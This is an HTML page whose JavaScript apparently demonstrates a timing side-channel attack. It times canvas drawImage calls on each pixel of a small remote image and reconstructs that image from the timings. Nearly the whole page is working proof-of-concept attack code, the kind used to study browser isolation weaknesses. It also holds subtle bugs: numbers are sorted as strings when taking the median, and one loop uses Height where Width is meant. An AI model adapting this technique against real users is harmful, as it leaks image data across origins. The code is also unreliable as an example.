<!doctype html>
<html>
<head>
	<meta charset='utf-8'>
	<style>
.big {
	width: 40px;
	height: 40px;
    image-rendering: pixelated; /* disables anti-aliasing */
}

#scratch {
	display: none;
}
	</style>
	<script>
let Histogram = null
let ScratchContext = null
let TargetImg = null

const Width = 5
const Height = 5

const Trials = 30
const TrialsDropped = 20
const Iters = 100

function median(lst) {
  let sorted = lst.slice(0).sort()
  return sorted[Math.floor(sorted.length / 2)]
}

function zeroDelay() {
  return new Promise(resolve => setTimeout(resolve, 0))
}

async function timePixel(image, x, y) {
  console.log('doing pixel', x, y)
  let times = []

  for (let i = 0; i < Trials; i++) {
    let startTime = performance.now()
    for (let j = 0; j < Iters; j++) {
      ScratchContext.drawImage(image, x, y, 1, 1, 0, 0, 1024, 1024)
    }
    await zeroDelay()
    let endTime = performance.now()
    times.push(endTime - startTime)
  }

  let timesCounted = times.slice(TrialsDropped)
  let result = median(timesCounted)
  console.log(result)

  return result
}

function drawHistogram(histogram) {
  let min = Math.min(...histogram.map(l => Math.min(...l)))
  let max = Math.max(...histogram.map(l => Math.max(...l)))

  console.log('got histogram', min, max)
  console.log(histogram)

  for (let y = 0; y < Height; y++) {
    for (let x = 0; x < Width; x++) {
      let color = Math.round(255 * (max - histogram[y][x]) / (max - min))
      Histogram.fillStyle = `rgb(${color}, ${color}, ${color})`
      Histogram.fillRect(x, y, 1, 1)
    }
  }
}

async function recoverImage() {
  console.log('recovering')
  let pixels = []

  for (let y = 0; y < Height; y++) {
    let row = []
    for (let x = 0; x < Height; x++) {
      row.push(await timePixel(TargetImg, x, y))
    }
    pixels.push(row)
  }

  drawHistogram(pixels)
}

function init() {
  ScratchContext = document.getElementById('scratch').getContext('2d')
  ScratchContext.imageSmoothingEnabled = false

  Histogram = document.getElementById('histogram').getContext('2d')
  Histogram.imageSmoothingEnabled = false

  TargetImg = document.getElementById('target')
  recoverImage()
}
	</script>
</head>
<body onload='init()'>
	<p>this is what the target image looks like:</p>
	<img
		id='target'
		src='https://p.2038.io/target_xsmall.png'
		class='big'
	>
	<p>this is our reconstruction:</p>
	<canvas id='histogram' class='big' width=5 height=5></canvas>
	<canvas id='scratch' width=1024 height=1024></canvas>
</body>
</html>
